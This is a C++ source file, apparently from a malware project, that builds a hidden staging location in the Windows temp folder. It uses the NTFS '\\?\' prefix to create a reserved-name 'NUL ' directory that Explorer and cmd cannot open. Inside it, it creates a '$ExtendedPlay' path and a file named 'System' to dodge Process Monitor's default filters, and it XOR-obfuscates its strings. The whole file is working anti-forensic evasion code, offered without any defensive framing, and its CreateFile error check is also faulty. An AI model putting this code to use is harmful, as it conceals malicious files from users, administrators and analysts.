#include "stdafx.h"
#include "BlackHole.h"
#include "StringEncrypt.h"

bool BlackHole::Create()
{
	wchar_t tmpPath[MAX_PATH];
	GetTempPath(MAX_PATH, tmpPath);
	XorS(NTFS_PREFIX, "\\\\?\\");
	XorS(NUL, "NUL ");
	XorS(ANTI_PROC_DIR, "\\movie.avi$ExtendedPlay");
	XorS(ANTI_PROC_EXE, "\\System");

	//Anti explorer/cmd folder - "NUL "
	std::wstring blackholeDir = NTFS_PREFIX.decrypt() + tmpPath + NUL.decrypt();
	if (!CreateDirectory(blackholeDir.c_str(), NULL)) {
#ifdef DEBUG
		ErrorMessage(std::wstring("Failed creating direcory - ") + blackholeDir);
#endif // DEBUG
		return false;
	}
		
	//anti procmon path - .*($Extend).*
	std::wstring antiProcPath = blackholeDir + ANTI_PROC_DIR.decrypt();
	if (!CreateDirectory(antiProcPath.c_str(), NULL)) {
#ifdef DEBUG
		ErrorMessage(std::wstring("Failed creating direcory - ") + antiProcPath);
#endif // DEBUG
		return false;
	}


	//anti procmon exe name - "SYSTEM"
	std::wstring antiProcMonExe = antiProcPath + ANTI_PROC_EXE.decrypt();
	if (!CreateFile(antiProcMonExe.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)) {
#ifdef DEBUG
		ErrorMessage(std::wstring("Failed creating file - ") + blackholeDir);
#endif // DEBUG
		return false;
	}
		

	return true;
}

